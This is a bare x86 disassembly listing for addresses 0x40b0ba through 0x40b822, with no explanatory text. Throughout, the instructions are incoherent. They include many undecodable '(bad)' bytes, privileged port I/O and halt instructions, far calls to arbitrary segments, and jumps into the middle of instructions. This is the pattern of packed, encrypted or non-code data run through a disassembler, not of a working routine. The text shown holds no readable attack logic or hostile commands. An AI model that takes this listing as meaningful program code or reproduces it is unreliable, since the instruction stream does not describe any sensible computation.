  40b0ba:	mov    ch,0xb3
  40b0bc:	or     DWORD PTR [edx+0x51],eax
  40b0bf:	daa    
  40b0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c1:	fsub   QWORD PTR [ebp+ecx*4-0x3c]
  40b0c5:	push   edx
  40b0c6:	rcl    DWORD PTR [ecx+ecx*2+0x6a39ec7c],1
  40b0cd:	inc    edx
  40b0ce:	sti    
  40b0cf:	shl    ecx,cl
  40b0d1:	shl    DWORD PTR [ecx],1
  40b0d3:	call   0xe842:0xa32ffcf1
  40b0da:	sahf   
  40b0db:	data16 sbb al,0xd8
  40b0de:	nop
  40b0df:	inc    edi
  40b0e0:	inc    eax
  40b0e1:	in     al,0x80
  40b0e3:	jle    0x40b144
  40b0e5:	sbb    esi,DWORD PTR [edx]
  40b0e7:	popa   
  40b0e8:	test   BYTE PTR [edx],bl
  40b0ea:	sub    eax,0x1ce0b528
  40b0ef:	or     BYTE PTR [esi+0x17],dh
  40b0f2:	mov    edx,0x664878d4
  40b0f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f8:	cmp    dh,BYTE PTR [ebp+0x69]
  40b0fb:	loopne 0x40b161
  40b0fd:	rol    DWORD PTR [ebp-0xe],cl
  40b100:	out    dx,al
  40b101:	push   edi
  40b102:	mov    cl,0x14
  40b104:	jae    0x40b177
  40b106:	adc    edi,DWORD PTR [edi+ecx*4-0x1]
  40b10a:	sub    dl,BYTE PTR [edx-0x3a319967]
  40b110:	(bad)  
  40b111:	lds    edi,FWORD PTR [ecx+ebx*1-0x27]
  40b115:	mov    esp,0x4e1e3d2d
  40b11a:	loopne 0x40b119
  40b11c:	xchg   ch,bl
  40b11e:	jl     0x40b13a
  40b120:	add    BYTE PTR [eax+ebx*2+0x78],bh
  40b124:	idiv   esp
  40b126:	xchg   BYTE PTR ds:0x298346b2,dh
  40b12c:	or     ah,BYTE PTR ds:0x1d760864
  40b132:	mov    WORD PTR [ecx+0x2],es
  40b135:	adc    DWORD PTR [ecx],0x7d
  40b138:	inc    ebx
  40b139:	aas    
  40b13a:	add    eax,0x5c7af7e8
  40b13f:	enter  0xc3f3,0xbf
  40b143:	fisttp DWORD PTR [ebp-0x1a]
  40b146:	stos   BYTE PTR es:[edi],al
  40b147:	adc    eax,0x1057ed6e
  40b14c:	inc    edi
  40b14d:	test   al,0xe4
  40b14f:	add    ebx,ebx
  40b151:	pushf  
  40b152:	xlat   BYTE PTR ds:[ebx]
  40b153:	ret    
  40b154:	inc    ecx
  40b155:	xchg   ecx,eax
  40b156:	out    0x23,al
  40b158:	xor    al,0xbf
  40b15a:	cmp    eax,0x50576b
  40b15f:	bound  ebx,QWORD PTR cs:[ecx-0x1c]
  40b163:	inc    eax
  40b164:	ins    DWORD PTR es:[edi],dx
  40b165:	(bad)  
  40b168:	fist   WORD PTR [ebx-0x28]
  40b16b:	sub    eax,0x789e153d
  40b170:	adc    DWORD PTR [esi-0x76fe1a91],esp
  40b176:	aad    0x8e
  40b178:	cmp    DWORD PTR [ebx],edx
  40b17a:	bnd je 0x40b17f
  40b17d:	icebp  
  40b17e:	pop    edi
  40b17f:	mov    ecx,0x213a14b6
  40b184:	in     eax,0x9e
  40b186:	adc    al,0x51
  40b188:	je     0x40b11b
  40b18a:	popa   
  40b18b:	or     eax,0x97282e
  40b190:	mov    dh,0x33
  40b192:	xor    al,0x95
  40b194:	sub    eax,0x62babf2d
  40b199:	and    bl,BYTE PTR [esi+0x5c]
  40b19c:	jo     0x40b162
  40b19e:	out    dx,eax
  40b19f:	jmp    0x40b13b
  40b1a1:	mov    ch,0xeb
  40b1a3:	arpl   WORD PTR [ecx-0x47],cx
  40b1a6:	sbb    DWORD PTR [edi+0x67],ebp
  40b1a9:	cmovb  esi,esi
  40b1ac:	repz repz imul ebx,esp,0xffffffd4
  40b1b1:	mov    dl,0x90
  40b1b3:	push   esi
  40b1b4:	(bad)  
  40b1b5:	adc    eax,0xdc868889
  40b1ba:	push   ebx
  40b1bb:	add    edx,DWORD PTR [edx]
  40b1bd:	mov    dl,0x74
  40b1bf:	lea    ebx,[edi]
  40b1c1:	sub    eax,0x5012fe95
  40b1c6:	inc    BYTE PTR [edi]
  40b1c8:	and    BYTE PTR [eax+ebx*1+0x24afd315],ah
  40b1cf:	out    dx,al
  40b1d0:	mov    eax,ds:0x47cff59e
  40b1d5:	pop    eax
  40b1d6:	jno    0x40b1d8
  40b1d8:	ins    BYTE PTR es:[edi],dx
  40b1d9:	lods   eax,DWORD PTR ds:[esi]
  40b1da:	push   ebx
  40b1db:	pop    esi
  40b1dc:	jae    0x40b196
  40b1de:	push   ss
  40b1df:	sahf   
  40b1e0:	jb     0x40b1a3
  40b1e2:	(bad)  
  40b1e3:	repz xor DWORD PTR [ebp-0x562f367a],esp
  40b1ea:	iret   
  40b1eb:	push   0x7693c78d
  40b1f0:	jmp    0x40b1a0
  40b1f2:	scas   al,BYTE PTR es:[edi]
  40b1f3:	sbb    dh,cl
  40b1f5:	xor    ch,dl
  40b1f7:	lods   al,BYTE PTR ds:[esi]
  40b1f8:	add    ah,BYTE PTR [eax]
  40b1fa:	gs push 0xa6c6c273
  40b200:	sti    
  40b201:	sbb    ebx,DWORD PTR [esi-0x1725cc34]
  40b207:	inc    edx
  40b208:	out    0x40,eax
  40b20a:	rcr    BYTE PTR [ecx],1
  40b20c:	mov    al,0x9a
  40b20e:	ret    
  40b20f:	leave  
  40b210:	sub    eax,0xb2cebb5d
  40b215:	mov    dh,0xf
  40b217:	pop    es
  40b218:	test   ecx,eax
  40b21a:	cmp    BYTE PTR [edx+0x457d11f2],dl
  40b220:	sbb    al,0xa0
  40b222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b223:	mov    dl,0x43
  40b225:	fldenv [eax+0xf]
  40b228:	sbb    eax,0xf8e2f113
  40b22d:	and    al,0x2a
  40b22f:	and    al,0x0
  40b231:	push   ebx
  40b232:	(bad)  
  40b233:	mov    ds:0x7881633e,eax
  40b238:	retf   0x24ca
  40b23b:	jl     0x40b21c
  40b23d:	ror    BYTE PTR [eax],1
  40b23f:	sbb    al,0xf5
  40b241:	mov    ds,WORD PTR ds:0xa6e1916b
  40b247:	outs   dx,BYTE PTR ds:[esi]
  40b248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b249:	(bad)  [ebx+0x3f]
  40b24c:	cmp    eax,0x9cf2a696
  40b251:	dec    edi
  40b252:	adc    eax,0x9cf6fb55
  40b257:	pop    es
  40b258:	js     0x40b1dc
  40b25a:	cmp    esp,ebx
  40b25c:	and    ebp,DWORD PTR [ecx+0x548c005e]
  40b262:	inc    edi
  40b263:	call   0xe8aa:0xf9645147
  40b26a:	and    al,0x54
  40b26c:	jecxz  0x40b206
  40b26e:	push   edi
  40b26f:	and    ah,BYTE PTR [ecx+0x67]
  40b272:	push   edx
  40b273:	sub    al,0xf0
  40b275:	jmp    0xc2ffa88b
  40b27a:	jnp    0x40b2ae
  40b27c:	mov    esi,0xca7ed1d2
  40b281:	mov    edi,DWORD PTR [ecx-0x46]
  40b284:	imul   edx,DWORD PTR [eax-0x68],0x6968ed9b
  40b28b:	sar    BYTE PTR [esi+edi*1+0x7],1
  40b28f:	cs cmp eax,0x43dcf562
  40b295:	ins    DWORD PTR es:[edi],dx
  40b296:	push   ebx
  40b297:	xchg   DWORD PTR [edi+0x68],ebp
  40b29a:	jmp    0x4f56ab6c
  40b29f:	mov    es:0xad92edd8,eax
  40b2a5:	jns    0x40b281
  40b2a7:	adc    cl,bh
  40b2a9:	mov    ds:0x357e5e59,eax
  40b2ae:	sbb    esp,DWORD PTR [edx+eiz*8-0x5dd3f117]
  40b2b5:	pop    edx
  40b2b6:	add    eax,0x439415a8
  40b2bb:	por    mm7,QWORD PTR [edx-0x31]
  40b2bf:	ficom  WORD PTR [ecx+0x17]
  40b2c2:	xchg   dh,al
  40b2c4:	fdivr  QWORD PTR [edx-0x9]
  40b2c7:	mov    cl,0x67
  40b2c9:	pop    es
  40b2ca:	adc    al,0x80
  40b2cc:	mov    ebp,0x8f2c1bcd
  40b2d1:	jbe    0x40b346
  40b2d3:	daa    
  40b2d4:	addr16 in eax,dx
  40b2d6:	jnp    0x40b2f2
  40b2d8:	push   0x9f25a214
  40b2dd:	lahf   
  40b2de:	ror    DWORD PTR [ecx+0x78],0xbb
  40b2e2:	or     eax,DWORD PTR [eax+0x1ae9f13c]
  40b2e8:	aam    0x99
  40b2ea:	dec    esp
  40b2eb:	push   esp
  40b2ec:	add    eax,0x186a7ebd
  40b2f1:	adc    ebx,DWORD PTR [ebx]
  40b2f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f4:	mov    dh,0xd3
  40b2f6:	enter  0xc1b0,0xd1
  40b2fa:	pop    ss
  40b2fb:	inc    edx
  40b2fc:	or     ebp,DWORD PTR [edi+ebx*2+0x1f]
  40b300:	jbe    0x40b326
  40b302:	ds push 0x69
  40b305:	icebp  
  40b306:	xor    eax,0xf995fb7f
  40b30b:	jmp    0xdf3e:0xe73a8797
  40b312:	sub    al,0x59
  40b314:	shl    BYTE PTR [ebp-0x31452e2],1
  40b31a:	pop    ebx
  40b31b:	lahf   
  40b31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b31d:	int    0xd7
  40b31f:	cmp    al,0x93
  40b321:	lods   al,BYTE PTR ds:[esi]
  40b322:	xor    eax,0x9bdbcd13
  40b327:	or     esi,edi
  40b329:	push   ecx
  40b32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b32b:	jmp    0xfcf679a0
  40b330:	mov    esp,0xc0a827c6
  40b335:	fild   DWORD PTR [edi]
  40b337:	mov    ds:0xdfd0ea4f,al
  40b33c:	and    ch,BYTE PTR [esi-0x4c92955e]
  40b342:	sbb    dh,BYTE PTR [ebp+0x18c45ba2]
  40b348:	aas    
  40b349:	inc    ecx
  40b34a:	(bad)  
  40b34b:	repz or al,0xe5
  40b34e:	jmp    DWORD PTR [ebx+0x5906851b]
  40b354:	add    eax,0x179846ae
  40b359:	or     BYTE PTR [ebp-0x72516b06],0x73
  40b360:	je     0x40b3a1
  40b362:	jle    0x40b3b9
  40b364:	test   BYTE PTR [esi-0x68],0x90
  40b368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b369:	scas   eax,DWORD PTR es:[edi]
  40b36a:	mov    ch,0x53
  40b36c:	mov    ds:0x19e37cf1,eax
  40b371:	iret   
  40b372:	xchg   ecx,eax
  40b373:	cwde   
  40b374:	scas   eax,DWORD PTR es:[edi]
  40b375:	mov    BYTE PTR [eax-0x66],0x5b
  40b379:	add    al,0x73
  40b37b:	popa   
  40b37c:	jne    0x40b3dd
  40b37e:	nop
  40b37f:	or     al,0x3e
  40b381:	dec    DWORD PTR [ebx+eiz*1+0x5f020634]
  40b388:	add    eax,0x96c9fe35
  40b38d:	xchg   DWORD PTR [edi],edx
  40b38f:	dec    ecx
  40b390:	mov    ebx,0x664a6e8
  40b395:	popf   
  40b396:	pop    edi
  40b397:	push   edi
  40b398:	add    eax,0x34562fb3
  40b39d:	outs   dx,DWORD PTR ds:[esi]
  40b39e:	daa    
  40b39f:	ja     0x40b3de
  40b3a1:	mov    bh,0xfa
  40b3a3:	dec    esp
  40b3a4:	fisub  WORD PTR [ecx]
  40b3a6:	fcomp  DWORD PTR [ecx+ebp*8]
  40b3a9:	iret   
  40b3aa:	jae    0x40b40c
  40b3ac:	(bad)  [edx]
  40b3ae:	sar    DWORD PTR [edi],cl
  40b3b0:	xor    DWORD PTR [edi-0xedae0c0],ebp
  40b3b6:	aad    0x71
  40b3b8:	sbb    bh,BYTE PTR [ecx-0x2929a8a4]
  40b3be:	push   ebx
  40b3bf:	leave  
  40b3c0:	pop    ss
  40b3c1:	pop    edi
  40b3c2:	enter  0x24c3,0x68
  40b3c6:	cmp    edi,DWORD PTR ds:0xcb3c621d
  40b3cc:	jge    0x40b414
  40b3ce:	dec    ebp
  40b3cf:	iret   
  40b3d0:	arpl   WORD PTR [edi+ecx*4],bx
  40b3d3:	outs   dx,DWORD PTR ds:[esi]
  40b3d4:	push   0x34
  40b3d6:	vmaxpd ymm6,ymm3,YMMWORD PTR [ebx-0x4eccfeaa]
  40b3de:	push   0xffffffae
  40b3e0:	add    cl,ch
  40b3e2:	fdivrp st(2),st
  40b3e4:	sbb    BYTE PTR [edi-0x8],cl
  40b3e7:	jl     0x40b381
  40b3e9:	(bad)  
  40b3ea:	(bad)  
  40b3eb:	hlt    
  40b3ec:	xchg   edx,eax
  40b3ed:	enter  0xa115,0x5a
  40b3f1:	pop    edx
  40b3f2:	rcl    DWORD PTR [ecx+0x45a56e57],1
  40b3f8:	push   eax
  40b3f9:	sub    eax,0xdd3fcddb
  40b3fe:	out    0xe7,al
  40b400:	mov    eax,0x6e483ca1
  40b405:	adc    al,0xa6
  40b407:	push   esi
  40b408:	xchg   esi,eax
  40b409:	sub    esi,DWORD PTR [ebx]
  40b40b:	mov    BYTE PTR [ecx],ch
  40b40d:	sbb    ebp,ebp
  40b40f:	ins    BYTE PTR es:[edi],dx
  40b410:	mov    al,0xa2
  40b413:	add    al,BYTE PTR [edi]
  40b415:	pop    esi
  40b416:	imul   ebx,DWORD PTR [ebp+0x60ef9d8a],0xc54d8e89
  40b420:	xor    DWORD PTR [esi+0x49],ebx
  40b423:	test   BYTE PTR [edx],dl
  40b425:	add    al,0x7f
  40b427:	or     DWORD PTR [esi],edi
  40b429:	cld    
  40b42a:	push   esp
  40b42b:	xchg   DWORD PTR [ecx-0x40],edi
  40b42e:	mov    edi,0x22d6a659
  40b433:	dec    ebx
  40b434:	retf   0x5d72
  40b437:	sub    ch,BYTE PTR [eax*2-0x183c2716]
  40b43e:	pop    edx
  40b43f:	or     DWORD PTR [eax],ebx
  40b441:	mov    al,ds:0x21c2c600
  40b446:	call   0x43fc:0xa62c7514
  40b44d:	jg     0x40b4a1
  40b44f:	dec    ebx
  40b450:	and    edx,DWORD PTR [edx+ecx*2]
  40b453:	jp     0x40b3ff
  40b455:	inc    eax
  40b456:	xlat   BYTE PTR ss:[ebx]
  40b458:	and    DWORD PTR [ecx],eax
  40b45a:	jmp    0x829b:0x4e8ebe56
  40b461:	jno    0x40b40d
  40b463:	sub    DWORD PTR [esi+eax*4-0x6a],esp
  40b467:	mov    ah,0xc9
  40b469:	aas    
  40b46a:	jne    0x40b3f0
  40b46c:	add    DWORD PTR [edx],ebp
  40b46e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b46f:	mov    ch,0xce
  40b471:	push   es
  40b472:	(bad)  
  40b473:	pop    esi
  40b474:	ins    DWORD PTR es:[edi],dx
  40b475:	and    BYTE PTR [esi],dh
  40b477:	test   esp,edx
  40b479:	in     eax,dx
  40b47a:	mov    ds:0xf32d222c,al
  40b47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b480:	lea    ebx,[esi]
  40b482:	add    ebx,DWORD PTR [ebx+0x11536fb5]
  40b488:	push   es
  40b489:	dec    esp
  40b48a:	das    
  40b48b:	xchg   edi,eax
  40b48c:	sbb    cl,BYTE PTR [ecx]
  40b48e:	shl    ch,cl
  40b490:	mov    ebp,0xcaa202d6
  40b495:	and    ecx,DWORD PTR [ebx]
  40b497:	fisub  DWORD PTR [esi+ebx*4-0x4]
  40b49b:	mov    cl,0x59
  40b49d:	test   BYTE PTR [edi+0x60],bh
  40b4a0:	call   0xdb47e04b
  40b4a5:	pushfw 
  40b4a7:	gs mov bl,0xc0
  40b4aa:	adc    ecx,esi
  40b4ac:	xor    al,0x54
  40b4ae:	jae    0x40b448
  40b4b0:	sbb    DWORD PTR [eax-0x9],edx
  40b4b3:	aaa    
  40b4b4:	add    DWORD PTR [ebx+0x40453db],ebx
  40b4ba:	add    cl,BYTE PTR [esi-0x4f66dc25]
  40b4c0:	jg     0x40b4c4
  40b4c2:	ficomp WORD PTR [edx-0x348f5e01]
  40b4c8:	int3   
  40b4c9:	pop    es
  40b4ca:	imul   ebx,ecx,0xa61d34a2
  40b4d0:	jmp    0xb0612ed5
  40b4d5:	imul   esp,edx,0x28
  40b4d8:	adc    edi,ecx
  40b4da:	je     0x40b523
  40b4dc:	push   eax
  40b4dd:	fucomi st,st(3)
  40b4df:	shr    edi,0xea
  40b4e2:	jecxz  0x40b494
  40b4e4:	inc    edx
  40b4e5:	call   0x972971c6
  40b4ea:	pop    ebx
  40b4eb:	(bad)  
  40b4ee:	sbb    esi,edx
  40b4f0:	ret    0x5c42
  40b4f3:	cmp    ebx,DWORD PTR [edx-0x561ecce4]
  40b4f9:	add    BYTE PTR [esi-0x66],dl
  40b4fc:	add    ecx,esi
  40b4fe:	ret    
  40b4ff:	jns    0x40b51c
  40b501:	call   0x87a7db0a
  40b506:	adc    al,0x83
  40b508:	popa   
  40b509:	ins    BYTE PTR es:[edi],dx
  40b50a:	add    ebp,DWORD PTR [ebx]
  40b50c:	test   DWORD PTR [eax],0xf9543274
  40b512:	dec    ecx
  40b513:	dec    ecx
  40b514:	inc    esp
  40b515:	dec    eax
  40b516:	inc    edi
  40b517:	push   es
  40b518:	fcom   QWORD PTR [esi]
  40b51a:	out    0x9e,al
  40b51c:	pop    edx
  40b51d:	pop    ebp
  40b51e:	or     ebp,DWORD PTR [ebx]
  40b520:	not    DWORD PTR [ecx-0xf]
  40b523:	nop
  40b524:	fldenv [edx+0x72bcf8e2]
  40b52a:	dec    edi
  40b52b:	loop   0x40b55f
  40b52d:	mov    esi,0x13ef664d
  40b532:	push   ecx
  40b533:	hlt    
  40b534:	mov    ecx,0x383448aa
  40b539:	out    0x3,al
  40b53b:	push   ds
  40b53c:	pop    eax
  40b53d:	jnp    0x40b4c9
  40b53f:	arpl   di,ax
  40b541:	mov    ch,0x6d
  40b543:	xchg   edx,eax
  40b544:	imul   esp,DWORD PTR [edx-0x2b],0x64010a8c
  40b54b:	rcr    DWORD PTR [edx-0x49],1
  40b54e:	sar    DWORD PTR [eax],1
  40b550:	cmc    
  40b551:	daa    
  40b552:	push   ss
  40b553:	mov    cl,0xc9
  40b555:	aas    
  40b556:	pop    eax
  40b557:	(bad)  
  40b558:	xor    cl,BYTE PTR [edi]
  40b55a:	pushf  
  40b55b:	sub    ebp,esp
  40b55d:	sbb    eax,0x202559d9
  40b562:	out    dx,eax
  40b563:	inc    edx
  40b564:	fs xor eax,0x28e490f5
  40b56a:	add    al,0xc4
  40b56c:	mov    ebx,edx
  40b56e:	fmul   DWORD PTR [ebx]
  40b570:	fmul   DWORD PTR [esi-0x19]
  40b573:	xchg   ebp,eax
  40b574:	in     al,0xcf
  40b576:	lods   eax,DWORD PTR ds:[esi]
  40b577:	nop
  40b578:	sub    ah,BYTE PTR [ecx+eiz*1-0x664db3a1]
  40b57f:	add    edx,DWORD PTR [ecx]
  40b581:	not    BYTE PTR [ebx-0x1c]
  40b584:	adc    eax,0x10a450d2
  40b589:	cmp    al,0x77
  40b58b:	pop    esp
  40b58c:	jge    0x40b542
  40b58e:	fadd   DWORD PTR [edi+0x5e]
  40b591:	dec    edi
  40b592:	ins    DWORD PTR es:[edi],dx
  40b593:	pusha  
  40b594:	cmp    cl,bh
  40b596:	jg     0x40b60e
  40b598:	je     0x40b5f3
  40b59a:	mov    bl,0xd6
  40b59c:	lods   al,BYTE PTR ds:[esi]
  40b59d:	or     bl,dl
  40b59f:	mov    edx,0x578bd7d5
  40b5a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a5:	dec    ebx
  40b5a6:	xchg   BYTE PTR [ebp-0x74],bl
  40b5a9:	adc    ax,0xe20e
  40b5ad:	adc    al,0x7a
  40b5af:	inc    edx
  40b5b0:	push   ss
  40b5b1:	adc    eax,eax
  40b5b3:	adc    ebp,ebp
  40b5b5:	pop    edi
  40b5b6:	xchg   edi,eax
  40b5b7:	mov    dl,0xa6
  40b5b9:	jae    0x40b619
  40b5bb:	xchg   BYTE PTR [esi+edi*8+0x1b],dh
  40b5bf:	daa    
  40b5c0:	jo     0x40b582
  40b5c2:	sbb    al,bl
  40b5c4:	sahf   
  40b5c5:	repz xchg edx,eax
  40b5c7:	jmp    0xfac8:0xeaebaab2
  40b5ce:	inc    esi
  40b5cf:	dec    edi
  40b5d0:	popf   
  40b5d1:	xor    cl,BYTE PTR [eax+eax*2-0x3f]
  40b5d5:	push   ds
  40b5d6:	jmp    0x2a4a07f5
  40b5db:	shl    edx,0x64
  40b5de:	call   0xf0fc2ba6
  40b5e3:	imul   BYTE PTR [esi]
  40b5e5:	in     al,0xc2
  40b5e7:	(bad)
  40b5ea:	sub    eax,0x3aadd26
  40b5ef:	(bad)  
  40b5f0:	xchg   ebx,eax
  40b5f1:	scas   al,BYTE PTR es:[edi]
  40b5f2:	aaa    
  40b5f3:	push   esi
  40b5f4:	loop   0x40b624
  40b5f6:	xchg   ebp,eax
  40b5f7:	adc    al,0xcf
  40b5f9:	push   ecx
  40b5fa:	inc    esi
  40b5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5fc:	add    edx,DWORD PTR [edx+0x3d]
  40b5ff:	repnz push 0xc
  40b602:	mov    ah,dl
  40b604:	(bad)  
  40b605:	aas    
  40b606:	or     al,0x9c
  40b608:	pop    esp
  40b609:	fst    DWORD PTR [edi-0x6268442c]
  40b60f:	fidivr WORD PTR [ebp-0x79]
  40b612:	pushf  
  40b613:	fs sbb edx,esi
  40b616:	or     al,bh
  40b618:	sub    esp,DWORD PTR [edx+eax*4]
  40b61b:	xor    al,0x80
  40b61d:	push   eax
  40b61e:	jne    0x40b5d8
  40b620:	dec    esp
  40b621:	adc    esi,DWORD PTR [edi+0x211362e2]
  40b627:	xor    eax,0x6226db5
  40b62c:	pop    es
  40b62d:	fsub   QWORD PTR [edx]
  40b62f:	adc    dl,BYTE PTR [ebx]
  40b631:	adc    DWORD PTR [esi+ebp*2],0x7d
  40b635:	push   0xffffff97
  40b637:	jbe    0x40b5e5
  40b639:	nop
  40b63a:	cwde   
  40b63b:	pop    ss
  40b63c:	jno    0x40b607
  40b63e:	int3   
  40b63f:	jbe    0x40b60b
  40b641:	pop    ss
  40b642:	add    eax,0x975da681
  40b647:	xor    DWORD PTR [esi-0x44],esi
  40b64a:	addr16 pop edi
  40b64c:	retf   
  40b64d:	cld    
  40b64e:	into   
  40b64f:	rcr    ebx,cl
  40b651:	cmp    eax,0xd1a98427
  40b656:	aam    0xa9
  40b658:	scas   eax,DWORD PTR es:[edi]
  40b659:	and    DWORD PTR [ecx-0x7d24e546],esp
  40b65f:	call   DWORD PTR [edx-0x6e]
  40b662:	xor    eax,0xd46cc751
  40b667:	in     al,0x80
  40b669:	aas    
  40b66a:	and    eax,0x66309be0
  40b66f:	add    eax,0xdf74da78
  40b674:	jp     0x40b6a3
  40b676:	leave  
  40b677:	cmp    esp,DWORD PTR [ebx]
  40b679:	cmp    ah,BYTE PTR [ecx-0x4e02199c]
  40b67f:	shl    BYTE PTR [edx-0x1ccd5dd0],cl
  40b685:	mov    ah,0xe6
  40b687:	and    bh,0xa1
  40b68a:	repz icebp 
  40b68c:	dec    esp
  40b68d:	fidiv  DWORD PTR [ecx]
  40b68f:	and    al,0xa2
  40b691:	and    dl,dh
  40b693:	mov    fs,WORD PTR [edx]
  40b695:	ds (bad) 
  40b697:	nop
  40b698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b699:	test   BYTE PTR [edx+edx*2+0x5a33941d],dl
  40b6a0:	cs call 0x3cbebef6
  40b6a6:	retf   0x1ad7
  40b6a9:	inc    edx
  40b6aa:	ficom  WORD PTR [esi-0x23]
  40b6ad:	adc    ebp,esi
  40b6af:	cld    
  40b6b0:	pop    edx
  40b6b1:	push   ds
  40b6b2:	and    ebx,DWORD PTR [eax]
  40b6b4:	push   cs
  40b6b5:	hlt    
  40b6b6:	push   ecx
  40b6b7:	jne    0x40b67c
  40b6b9:	mov    bh,0x8b
  40b6bb:	push   edi
  40b6bc:	stc    
  40b6bd:	(bad)  
  40b6be:	stos   DWORD PTR es:[edi],eax
  40b6bf:	jmp    0xa6dc:0xc2a9b83e
  40b6c6:	clc    
  40b6c7:	std    
  40b6c8:	fidiv  WORD PTR [ebp+0x2036fee2]
  40b6ce:	es add eax,0x587d533e
  40b6d4:	jp     0x40b6b5
  40b6d6:	gs hlt 
  40b6d8:	inc    ebp
  40b6d9:	cmp    dh,bl
  40b6db:	in     eax,dx
  40b6dc:	arpl   si,bx
  40b6de:	push   ss
  40b6df:	mov    ebp,0xb62c136f
  40b6e4:	cmp    al,0x77
  40b6e6:	(bad)  
  40b6e7:	in     al,0x8f
  40b6e9:	cdq    
  40b6ea:	imul   edx,edx,0xb7ecf023
  40b6f0:	mov    BYTE PTR [esi],dh
  40b6f2:	imul   ebx,DWORD PTR [edx],0xffffffca
  40b6f5:	adc    esp,DWORD PTR [ecx-0x39650c81]
  40b6fb:	xor    bh,dh
  40b6fd:	jo     0x40b726
  40b6ff:	les    esp,FWORD PTR [edx+eiz*2-0x3222acb5]
  40b706:	sbb    al,0x7f
  40b708:	push   0x693342e7
  40b70d:	push   ss
  40b70e:	sbb    DWORD PTR fs:[ebx+0x59],esp
  40b712:	sbb    BYTE PTR [edi+0x644c71e],cl
  40b718:	je     0x40b723
  40b71a:	sub    DWORD PTR [ebx+0x34],edi
  40b71d:	cld    
  40b71e:	mov    bh,0xe
  40b720:	loope  0x40b732
  40b722:	inc    eax
  40b723:	cs sub eax,0x12666798
  40b729:	pop    eax
  40b72a:	je     0x40b71a
  40b72c:	mov    edi,0x84588d84
  40b731:	cdq    
  40b732:	(bad)  
  40b733:	or     cl,BYTE PTR [ebx]
  40b735:	cmp    DWORD PTR [esp+eax*2+0x77],esi
  40b739:	xor    al,0x24
  40b73b:	adc    eax,0xa6311b97
  40b740:	cmp    eax,DWORD PTR [eax]
  40b742:	das    
  40b743:	or     BYTE PTR [edx-0x73],0x5a
  40b747:	xchg   ebx,eax
  40b748:	or     eax,esp
  40b74a:	mov    ebp,0xc5822732
  40b74f:	sbb    esi,DWORD PTR [ebp+0x58]
  40b752:	mov    cl,BYTE PTR [esi+0x60]
  40b755:	adc    esp,esp
  40b757:	mov    ch,0xad
  40b759:	call   0xc040:0x99a8b57b
  40b760:	add    BYTE PTR [esi+0x15],dl
  40b763:	dec    edx
  40b764:	push   ebp
  40b765:	test   eax,0xaa28c0f9
  40b76a:	cs pop eax
  40b76c:	shl    DWORD PTR [esp+edi*8+0x28fafff8],1
  40b773:	shl    DWORD PTR [edx+0x6d9f454],1
  40b779:	mov    eax,0x22d6774
  40b77e:	inc    eax
  40b77f:	popa   
  40b780:	and    BYTE PTR [eax-0x2f],al
  40b783:	aam    0x3f
  40b785:	dec    esi
  40b786:	sub    al,BYTE PTR [ebx+0x6e]
  40b789:	inc    edi
  40b78a:	scas   al,BYTE PTR es:[edi]
  40b78b:	loopne 0x40b78a
  40b78d:	sub    BYTE PTR [edx],ah
  40b78f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b791:	inc    ebp
  40b792:	mov    al,ds:0x86b73e60
  40b797:	pop    ebp
  40b798:	aas    
  40b799:	jmp    0x40b71d
  40b79b:	dec    esi
  40b79c:	fsubr  DWORD PTR [edx]
  40b79e:	stc    
  40b79f:	jle    0x40b743
  40b7a1:	retf   0x190f
  40b7a4:	jb     0x40b7ed
  40b7a6:	push   ebp
  40b7a7:	xlat   BYTE PTR ds:[ebx]
  40b7a8:	sahf   
  40b7a9:	xor    DWORD PTR [esi+0x79458c0],0xc4bdeaf
  40b7b3:	jo     0x40b7de
  40b7b5:	(bad)  
  40b7b6:	push   edx
  40b7b7:	pop    ebx
  40b7b8:	dec    esi
  40b7b9:	pop    ds
  40b7ba:	mov    esp,0xf5909c66
  40b7bf:	pop    ss
  40b7c0:	dec    edi
  40b7c1:	push   ss
  40b7c2:	cwde   
  40b7c3:	pop    ss
  40b7c4:	nop
  40b7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c6:	addr16 dec ebp
  40b7c8:	adc    al,0xde
  40b7ca:	jnp    0x40b7dd
  40b7cc:	jae    0x40b769
  40b7ce:	sbb    eax,DWORD PTR [edx]
  40b7d0:	loop   0x40b7bb
  40b7d2:	ins    BYTE PTR es:[edi],dx
  40b7d3:	fimul  WORD PTR [eax]
  40b7d5:	ins    BYTE PTR es:[edi],dx
  40b7d6:	sbb    al,0xb0
  40b7d8:	cmp    eax,0xc87ffa4a
  40b7dd:	xor    ecx,DWORD PTR [ebx+0x2362c862]
  40b7e3:	and    ah,dh
  40b7e5:	cli    
  40b7e6:	xor    BYTE PTR [edx],cl
  40b7e8:	cmp    al,BYTE PTR [ebp+0x6c0be109]
  40b7ee:	mov    es,edx
  40b7f0:	and    eax,0x4ea2075f
  40b7f5:	and    edx,ebp
  40b7f7:	sti    
  40b7f8:	pop    edi
  40b7f9:	mov    cl,0x74
  40b7fb:	popa   
  40b7fc:	dec    esi
  40b7fd:	clc    
  40b7fe:	xor    DWORD PTR [edi+0x29d62a94],edx
  40b804:	lds    ebp,FWORD PTR [ebx]
  40b806:	push   esp
  40b807:	int    0xfb
  40b809:	sbb    al,0x29
  40b80b:	iret   
  40b80c:	aas    
  40b80d:	sti    
  40b80e:	retf   0x9c7a
  40b811:	pop    eax
  40b812:	cmc    
  40b813:	sbb    eax,0x805cc983
  40b818:	popf   
  40b819:	lods   al,BYTE PTR ds:[esi]
  40b81a:	or     BYTE PTR [eax-0x41b626cd],dl
  40b820:	push   esi
  40b821:	hlt    
  40b822:	mov    es:0x4bdbf12,eax
